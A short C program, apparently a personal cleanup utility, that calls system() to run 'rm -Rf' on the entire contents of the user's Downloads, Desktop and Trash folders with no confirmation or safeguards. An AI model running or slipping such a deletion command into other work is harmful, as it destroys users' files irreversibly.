#include  <stdlib.h>

int main() {

  char cmd[] = "rm -Rf $HOME/Downloads/* $HOME/Desktop/* $HOME/.Trash/* $HOME/.Trash/.DS_Store";
  system(cmd);  

  return 0;
}

